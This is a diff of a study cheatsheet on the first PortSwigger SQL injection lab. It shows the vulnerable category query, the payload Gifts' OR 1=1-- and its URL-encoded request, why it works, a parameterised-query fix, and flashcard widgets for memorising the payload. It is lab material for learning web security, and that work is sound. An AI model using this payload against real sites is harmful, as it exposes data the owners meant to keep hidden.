@@ -1,13 +1,52 @@
 ---
 title: "Portswigger SQL Injection Lab 1"
-date: "2025-05-31T09:57:00+05:45"
-excerpt: "SQL injection vulnerability in WHERE clause allowing retrieval of hidden data"
-tags: []
+date: '2026-06-21'
+excerpt: "PortSwigger lab where the category filter drops your input into the query, so injecting ' OR 1=1-- unhides every product, released or not."
+tags: ["SQL Injection", "PortSwigger", "Web Security"]
 category: "Web Security"
 type: "cheatsheet"
 ---
 
-> This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:
-  `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
-   To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.
+# Portswigger SQL Injection Lab 1
 
+The product category filter is the injection point. The app builds the query by hand, so a quote in `category` breaks out of the string.
+
+## The vulnerable query
+
+```sql
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+```
+
+Two things matter: the value sits inside single quotes, and the trailing `AND released = 1` is what hides unreleased products.
+
+## The payload
+
+Set the `category` parameter to:
+
+```text
+Gifts' OR 1=1--
+```
+
+The query becomes:
+
+```sql
+SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
+```
+
+The `--` comments out everything after it, so `released = 1` no longer applies and every product returns. In the browser the payload is URL-encoded:
+
+```text
+/filter?category=Gifts'+OR+1=1--
+```
+
+## Why it works
+
+`OR 1=1` is always true, so the WHERE clause matches every row. The `--` comment eats the closing quote and the `AND released = 1` filter that would otherwise hide the unreleased items.
+
+## The fix
+
+Use a parameterised query so the category is passed as data, never concatenated into the SQL string.
+
+<Cloze title="Payload recall" text="Set category to Gifts{{' OR 1=1--}} to comment out the rest of the query and return every row." />
+
+<FlipCard front={<div>What goes in the category filter to reveal unreleased products?</div>} back={<div>Gifts' OR 1=1-- (the -- comments out the trailing AND released = 1).</div>} color="#ff2d95" />
